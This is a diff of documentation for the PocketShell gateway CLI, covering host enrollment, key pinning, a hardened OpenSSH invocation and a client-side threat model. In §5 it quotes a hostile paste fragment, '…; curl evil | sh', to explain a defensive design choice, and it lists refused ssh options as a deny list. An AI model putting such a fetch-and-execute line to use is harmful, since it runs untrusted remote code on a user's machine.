@@ -1,13 +1,15 @@
-# Gateway host agent: `pocketshell gateway`
+# Gateway: `pocketshell gateway`
 
-`pocketshell gateway enroll|run|show` are the user-facing entry points for the
+`pocketshell gateway enroll|run|show` are the host-side entry points for the
 PocketShell **gateway transport**: the reverse-tunnel host agent for machines
 that have no inbound SSH (a phone cannot dial into a laptop behind NAT). The
 host holds one outbound WSS connection to the SSH gateway; the gateway opens
 multiplexed streams over it, each bridged to the host's own sshd listening on
-loopback. No inbound ports are opened anywhere.
+loopback. No inbound ports are opened anywhere. The client side —
+`pocketshell gateway devices|pin|ssh` on your laptop, reaching such a host
+with plain OpenSSH — is §9.
 
-The Python commands are deliberately thin: they resolve the installed Go
+The host-side Python commands are deliberately thin: they resolve the installed Go
 helper **`pocketshell-link`** and replace their own process with it
 (`os.execv`). No tunnel, enrollment, or SSH logic lives in Python. That is a
 feature, not a shortcut:
@@ -278,11 +280,29 @@ when the gateway itself is the adversary.
 
 ## 3. Enroll the host
 
-One-time per host. You need a fresh **gateway enrollment token** — a
-short-lived (≤ 5 minutes) token scoped to `pocketshell-gateway`, minted by
-the trusted PocketShell token service in exchange for your web-client
-sign-in. Generate it in the PocketShell web client's gateway settings
-(**Generate enrollment token**), then pipe it in:
+One-time per host. Enrollment needs a fresh **gateway enrollment token** —
+a short-lived (≤ 5 minutes) token scoped to `pocketshell-gateway`, minted by
+the trusted PocketShell token service. Two ways to supply it:
+
+**Logged in on the host (`pocketshell login`)** — just run
+
+```bash
+pocketshell gateway enroll
+```
+
+The wrapper first resolves and protocol-verifies the helper (§1.1), then
+mints the token from your login session and hands it to the helper as its
+entire stdin through a private pipe (`os.pipe` → write → close → `dup2`
+onto fd 0 → `execv`). The token is never in argv, the environment or a
+file, and your terminal's stdin is not inherited. Not logged in → exit
+**3** with a hint to run `pocketshell login` or use `--token-stdin`.
+Auto-minting only ever sends the token to the production gateway, or to a
+non-production `--server` you name exactly with `--trust-gateway HOST`
+(same strict URL rules as the client, §9.1); `--dev-broker-issuer` always
+needs a lab token on `--token-stdin`.
+
+**Token piped in** — generate it in the PocketShell web client's gateway
+settings (**Generate enrollment token**), then:
 
 ```bash
 pocketshell gateway enroll --token-stdin < enrollment-token.txt
@@ -297,13 +317,13 @@ Useful flags:
 
 ```bash
 pocketshell gateway enroll --token-stdin \
-    --device-id "office workstation" \
+    --device-id office-workstation \
     --ssh-host 127.0.0.1:22 \
     --expect-host-key "SHA256:AbCd…/Fp=" \
     --re-enroll
 ```
 
-- `--token-stdin` is required; `enroll` refuses to run without it. The token
+- With `--token-stdin` the token is read from your stdin. The token
   is short-lived — run enroll right after generating it. It travels only as
   the `Authorization` header of the enroll request, never in a URL, argv, or
   log line, and this wrapper passes stdin through opaquely (it never reads,
@@ -381,6 +401,20 @@ pocketshell gateway show
 
 `show` prints no secrets (the device private key stays in its `0600` file in
 the config dir).
+
+To let a client pin this host (§9.3), print just the host-key line:
+
+```bash
+pocketshell gateway show --host-key
+# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA…          ← stdout: the only thing to copy
+# device home-lab, host key SHA256:… (ED25519).  ← stderr: context
+# On the client run `pocketshell gateway pin home-lab` and paste the key line above at its prompt.
+```
+
+stdout is exactly one `<keytype> <base64>` line, re-validated with the
+client's strict pin parser — deliberately **not** a ready-to-run shell
+command (a compromised host could otherwise hand you `…; curl evil | sh` to
+paste). Compare the fingerprint on both ends.
 
 ## 6. Docker / local development gateways
 
@@ -460,12 +494,205 @@ enrolled with either one gateway or one legacy relay — never both mixed.
 
 ## 8. Status
 
-`pocketshell gateway` documents and wraps the host-side agent only. How the
-PocketShell phone/desktop app pairs and connects through this tunnel is
-separate, in-progress work elsewhere; nothing here implies that any client
-already uses it. The same goes for the enrollment-token flow: the web
+The host-side commands wrap the Go agent; the CLI client (§9) reaches
+enrolled hosts with OpenSSH. How the PocketShell phone/desktop app pairs
+and connects through this tunnel is separate, in-progress work elsewhere.
+The production gateway currently runs without its host registry, so
+`/api/v1/hosts/*` (and therefore `gateway ssh`) is not served there yet. The same goes for the enrollment-token flow: the web
 client's **Generate enrollment token** action and its broker exchange are
 being built (web client and token-service integration in progress, not
 deployed/production yet) — until they land, obtain tokens from lab tooling
 as in §6. This wrapper treats the token on stdin as opaque bytes either way;
 it will not change when the issuer UI ships.
+
+## 9. Client side: reach an enrolled host
+
+On the laptop you connect **from** (needs the `[link]` extra for
+`websockets`: `pip install 'pocketshell[link]'`):
+
+```bash
+pocketshell login                        # once: device sign-in, stores a CLI session
+pocketshell gateway devices              # list your enrolled hosts
+pocketshell gateway pin home-lab         # paste the line from `gateway show --host-key` ON THE HOST
+pocketshell gateway ssh home-lab -l me   # OpenSSH through the gateway
+```
+
+Every command that talks to the gateway mints a fresh short-lived (≤ 5
+min) broker JWT from the `pocketshell login` session and sends it only in
+the `Authorization` header (`devices`) or the first WebSocket text frame
+(`proxy`) — never in a URL, argv, environment variable, file or log line.
+Not logged in → exit **3**.
+
+### 9.1 Choosing the gateway
+
+The default is the production gateway `wss://gateway.pocketshell.io`
+(its `relay.pocketshell.io` alias is equally production). Any other
+`--server`:
+
+- must be a bare origin (`wss://host[:port]`, no path, query, fragment or
+  credentials), with a strict host — an IP literal or an IDNA-encoded DNS
+  name; whitespace, quotes, `%`, `?`, `#`, backslashes and shell
+  metacharacters are refused;
+- requires **`--trust-gateway HOST`** naming exactly that host. The client
+  sends it a real broker token, which a hostile server could replay
+  against the production identity API for up to five minutes;
+- plain `ws://`/`http://` additionally requires `--insecure-dev` **and** a
+  loopback IP literal or `localhost` (a single-label docker service name
+  such as `gateway` is accepted with a cleartext warning). TLS
+  certificate verification is never optional, and environment proxy
+  settings are not used for the WebSocket.
+
+### 9.2 `gateway devices [--json]`
+
+`GET /identity/v1/devices` with the bearer token (redirects are never
+followed — urllib would forward the header). Shows each device id,
+active/revoked, the host key fingerprint **as advertised by the gateway
+(untrusted)**, and your local pin state (`pinned`, `pinned (DIFFERS from
+advertised)`, `not pinned`). All gateway-provided text is sanitized. The
+JSON output carries fingerprints only, never the advertised key line, so
+`devices --json | … | gateway pin` cannot turn the gateway's claim into
+trust.
+
+### 9.3 `gateway pin DEVICE_ID` / `gateway unpin DEVICE_ID`
+
+Pinning is the **only** way a host key becomes trusted. Run
+`pocketshell gateway show --host-key` on the host (§5), bring that one
+line over a channel you trust, and paste it at the `gateway pin` prompt
+(or pipe it on stdin; a positional argument is also accepted and
+validated identically). The line must be exactly `<keytype> <base64>`
+(`ssh-ed25519`, `ecdsa-sha2-nistp256/384/521`, or `ssh-rsa` ≥ 2048 bits):
+printable ASCII, one space, canonical base64 decoding to a well-formed key
+blob of the stated type with nothing trailing. Comments, options, host
+patterns, `@cert-authority`/`@revoked` markers and extra lines are refused.
+`pin` prints the `SHA256:` fingerprint — compare it with the host's.
+
+Pins live in `${XDG_CONFIG_HOME:-~/.config}/pocketshell/gateway_known_hosts`
+(directory `0700`, file `0600`, written atomically) as
+`pocketshell-gateway.<device-id> <keytype> <base64>` lines. The whole file
+is re-validated on every read: a single foreign line (marker, wildcard,
+hashed host, comment, second key for one device), group/world-writable
+permissions, a foreign owner or a symlink makes it untrusted, and
+`gateway ssh` refuses to run. A different key for an already pinned device
+needs `--replace` (re-keyed host — verify on the host first).
+
+### 9.4 `gateway ssh DEVICE_ID [-l USER] [-i KEY] [-- SSH_ARGS…]`
+
+Execs the OpenSSH client (`ssh` resolved once to an absolute path) with an
+explicit configuration; refuses to run without a valid pin:
+
+- `-F none` — your `~/.ssh/config` is not read (`Host *` `ForwardAgent`,
+  `ProxyJump`, `LocalCommand`, `ControlMaster`… cannot apply);
+- host trust: `StrictHostKeyChecking=yes`, `UserKnownHostsFile=<pin file>`,
+  `GlobalKnownHostsFile=/dev/null`, `HostKeyAlias=pocketshell-gateway.<id>`,
+  `UpdateHostKeys=no`, `CheckHostIP=no`, `VerifyHostKeyDNS=no`,
+  `CanonicalizeHostname=no`;
+- nothing of yours is exposed to the host: `ForwardAgent=no`,
+  `ForwardX11=no`, `ForwardX11Trusted=no`, `ClearAllForwardings=yes` (only
+  dropped when you pass `-L`/`-D`), `Tunnel=no`, `PermitLocalCommand=no`,
+  `EnableEscapeCommandline=no` (with `IgnoreUnknown` for OpenSSH < 9.2);
+- no session sharing: `ControlMaster=no`, `ControlPath=none`,
+  `ControlPersist=no`, `ProxyUseFdpass=no`;
+- key authentication only: `PubkeyAuthentication=yes`,
+  `PreferredAuthentications=publickey`, `PasswordAuthentication=no`,
+  `KbdInteractiveAuthentication=no`, `GSSAPIAuthentication=no`,
+  `HostbasedAuthentication=no`, `IdentitiesOnly=yes` (always: `-i KEY`, or
+  your default `~/.ssh/id_*` files; agent-only keys without a file are not
+  offered); `Compression=no`, `ExitOnForwardFailure=yes`;
+- `ProxyCommand=<absolute python> -P -m pocketshell gateway proxy <id> […]`:
+  the device id is validated against `^[A-Za-z0-9][A-Za-z0-9._:-]{2,63}$`,
+  each element is `shlex.quote`d and `%` is doubled for ssh's token
+  expansion (no `%h`/`%n` tokens are used), ssh runs it with
+  `SHELL=/bin/sh`, and `-P` keeps a `pocketshell/` or `click.py` in your
+  current directory from being imported instead of the real package.
+
+The hardening `-o` options come first (for ssh, the first value wins), then
+your allowlisted arguments, then `--`, the destination alias, and the
+remote command. **Extra ssh arguments** (after `--`) are limited to
+`-L SPEC`, `-D SPEC`, `-N`, `-T`, `-t`, `-v`/`-vv`/`-vvv`, `-q`, followed by
+an optional remote command (passed verbatim; it runs in the remote shell,
+as with plain ssh). Everything else is refused — `-o` in any form, `-F`,
+`-J`, `-W`, `-A`, `-X`/`-Y`, `-M`/`-S`, `-w`, `-f`, `-p`, `-E`, and `-R`
+(remote forwarding would expose a port of your machine to the host).
+`-l` names are restricted to `[A-Za-z0-9_][A-Za-z0-9._@-]*`; the pin file
+and `-i` paths must be absolute and free of whitespace, `%`, `$`, `~`,
+quotes, backslashes and non-ASCII (ssh would expand or split them — set
+`XDG_CONFIG_HOME` to a plain path if your home directory has such
+characters).
+
+```bash
+pocketshell gateway ssh home-lab -l me -i ~/.ssh/id_ed25519
+pocketshell gateway ssh home-lab -l me -- -N -L 8080:localhost:80
+pocketshell gateway ssh home-lab -l me -- uptime
+```
+
+### 9.5 `gateway proxy DEVICE_ID` (the ProxyCommand)
+
+Normally started by `gateway ssh`. Dials
+`wss://<gw>/api/v1/hosts/<id>/ssh` (no query, no Origin header, no
+compression, no environment proxy), sends
+`{"type":"auth","v":1,"token":…,"device_id":…}` as the first text frame,
+and requires a strict `ready` frame (exact keys and types, `v` = 1, no
+duplicate keys or NaN, ≤ 16 KiB) whose `device_id` equals the requested
+one — all within one 30 s deadline covering TCP, TLS, the upgrade and
+`ready`. `ready.ssh_host_key` is ignored. Then it pumps raw SSH bytes as
+binary messages (≤ 32 KiB per write; inbound messages > 64 KiB, binary
+data before `ready`, or any text after `ready` abort the session). stdout
+carries SSH payload only; stdin EOF closes the WebSocket; a WebSocket
+close ends the process. Gateway error messages are printed to stderr only
+after stripping ANSI/VT sequences and every Unicode control/format
+character (bidi overrides, zero-width), on one line, capped at 200
+characters; unexpected errors print a one-line class name, never a
+traceback.
+
+| Exit | Meaning |
+| --- | --- |
+| 0 | clean end (stdin EOF, normal close) |
+| 1 | unexpected local error |
+| 2 | usage (bad device id / server) |
+| 3 | not logged in / no gateway token |
+| 4 | connect, TLS or HTTP-upgrade failure; unclassified refusal |
+| 5 | handshake timeout (local deadline or close 4408) |
+| 6 | gateway protocol violation (local detection or close 4400) |
+| 7 | unauthorized (close 4401/4403) |
+| 8 | unknown, revoked or not your device (close 4404) |
+| 9 | host offline (close 4503) |
+| 10 | quota (close 4429) |
+| 11 | connection lost after `ready` |
+
+### 9.6 Client-side threat model
+
+The security goal: a compromised gateway, broker or enrolled host must not
+get into the client's machine.
+
+**A compromised gateway** sees only ciphertext (SSH is end to end with
+the host's sshd) and cannot impersonate the host: the host key is checked
+by OpenSSH against your independent pin, never against anything the
+gateway sends (`ready.ssh_host_key` and `devices` are advisory). It
+**can**: deny or drop service; see connection metadata (which device, when,
+traffic volume); replay the broker token you sent it against the gateway
+identity API for up to five minutes (enroll/revoke devices — the token is
+gateway-scoped and does not reach your account itself); send hostile
+frames — which are size-bounded, strictly parsed, and sanitized before any
+byte reaches your terminal; nothing it sends reaches stdout except SSH
+payload consumed by ssh itself. It cannot make ssh forward your agent,
+X11, or local ports (all off, and your ssh_config is ignored), and it
+cannot inject options into the ssh or ProxyCommand line.
+
+**A compromised broker** can mint tokens and, with them, use the gateway
+identity API as you — including listing and revoking devices. It still
+cannot pass host-key verification for a pinned device, so it cannot
+intercept or impersonate your SSH sessions or reach your machine.
+
+**A compromised enrolled host** controls everything inside the SSH
+session it serves: output it shows you (escape sequences included —
+the same exposure as any SSH session), and any port you explicitly
+forward with `-L`/`-D` reaches a service *it* chose. It gets no agent, no
+X11, no remote forwarding (`-R` is refused), no escape command line, and
+no shared control socket. When pinning, the key line it prints is data
+(one validated `<keytype> <base64>` line), never a command, so a hostile
+host cannot trick you into running something by pasting.
+
+**Not covered:** a compromised client machine (it holds the login
+session, the pins and your SSH keys); you pinning a key without checking
+where it came from; hosts whose sshd still allows non-key authentication
+(see §2.1); denial of service by any party on the path.
